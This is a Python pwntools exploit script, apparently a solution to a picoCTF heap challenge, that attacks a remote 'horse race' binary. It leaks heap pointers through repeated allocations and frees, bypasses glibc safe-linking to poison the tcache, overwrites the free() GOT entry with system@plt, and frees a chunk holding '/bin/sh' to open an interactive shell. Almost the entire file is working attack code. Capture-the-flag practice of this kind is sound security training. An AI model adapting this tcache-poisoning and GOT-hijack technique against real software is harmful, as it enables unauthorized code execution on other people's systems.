#!/usr/bin/env python3
# Arcvjs - 2025
from pwn import *

exe = ELF("./vuln")
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'DEBUG'



def conn():
    r = remote("saturn.picoctf.net", 59657)
    return r


def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()


NUM_OF_HORSES = 0

def add_horse(index, size, name):
    index = str(index)
    size = str(size)
    r.recvuntil(b"Choice:")
    r.sendline(b'1')
    r.sendlineafter(b'?',index)
    r.sendlineafter(b'?',size)
    r.sendlineafter(b'characters:',(name))
    global NUM_OF_HORSES
    NUM_OF_HORSES += 1

def remove_horse(index):
    index = str(index)
    r.recvuntil(b"Choice:")
    r.sendline(b'2')
    r.sendlineafter(b'?',index)
    global NUM_OF_HORSES
    NUM_OF_HORSES -= 1

def infoleak():
    global NUM_OF_HORSES
    if NUM_OF_HORSES < 5:
        error("Not enough horses to leak info")
    r.recvuntil(b"Choice:")
    r.sendline(b'3')
    data = r.recvuntil(b'WINNER:')
    data2 = data.splitlines()[0:NUM_OF_HORSES]
    data2 = [line.strip(b" |\n\r") for line in data2]
    data2 = [line.ljust(8, b'\x00') for line in data2]
    data2 = [u64(line) for line in data2]
    return data2

def edit(index, name):
    index = str(index)
    r.recvuntil(b"Choice:")
    r.sendline(b'0')
    r.sendlineafter(b'?',index)
    r.sendlineafter(b':',(name))
    r.sendlineafter(b'?',b'0')

    
for i in range(12):
    add_horse(i, 256, b'\xff')

for i in range(11,-1,-1):
    remove_horse(i)


for i in range(12):
    add_horse(i, 256, b'\xff')

leak = infoleak()

remove_horse(6)
remove_horse(7)

for i in leak:
    print(hex(i))



heap_base = (leak[7] -1 ) << 12
print('got free:',hex(exe.got['free']))
mangled_got_free = mangle(heap_base, exe.got['free'] - 8 )



edit(7, p64(mangled_got_free) + b'\xff')
add_horse(15,256, b'/bin/sh\x00\xff')
add_horse(16,256, p64(exe.plt.system)  + p64(exe.plt.system)  + b'\xff')

remove_horse(15)



r.interactive()